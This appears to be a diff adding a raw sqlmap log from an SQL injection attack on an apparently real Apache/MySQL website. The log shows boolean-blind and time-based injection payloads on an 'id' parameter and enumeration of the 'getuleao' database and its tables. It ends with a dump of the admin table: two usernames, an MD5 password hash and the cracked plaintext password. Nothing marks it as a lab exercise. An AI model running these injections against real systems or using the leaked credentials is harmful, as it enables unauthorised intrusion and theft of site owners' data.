@@ -1,0 +1,95 @@
+sqlmap identified the following injection point(s) with a total of 393 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=60 AND 5168=5168
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=60 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] getuleao
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=60 AND 5168=5168
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=60 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: getuleao
+[14 tables]
++---------------+
+| admin         |
+| banner        |
+| categoriablog |
+| categoriagal  |
+| categorias    |
+| contador      |
+| conteudo      |
+| fotos         |
+| galerias      |
+| itemnews      |
+| news          |
+| newsletter    |
+| niveis        |
+| videos        |
++---------------+
+
+Database: getuleao
++---------------+---------+
+| Table         | Entries |
++---------------+---------+
+| fotos         | 63      |
+| videos        | 35      |
+| banner        | 34      |
+| conteudo      | 31      |
+| galerias      | 21      |
+| categoriagal  | 11      |
+| categorias    | 5       |
+| niveis        | 3       |
+| admin         | 2       |
+| categoriablog | 1       |
+| contador      | 1       |
++---------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=60 AND 5168=5168
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=60 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: getuleao
+Table: admin
+[2 entries]
++---------+---------+-------+------------------------------------------+---------+
+| idnivel | idadmin | nome  | senha                                    | usuario |
++---------+---------+-------+------------------------------------------+---------+
+| 1       | 1       | Admin | 827ccb0eea8a706c4c34a16891f84e7b (12345) | admin   |
+| 1       | 2       | Admin | 827ccb0eea8a706c4c34a16891f84e7b (12345) | sparta  |
++---------+---------+-------+------------------------------------------+---------+
+
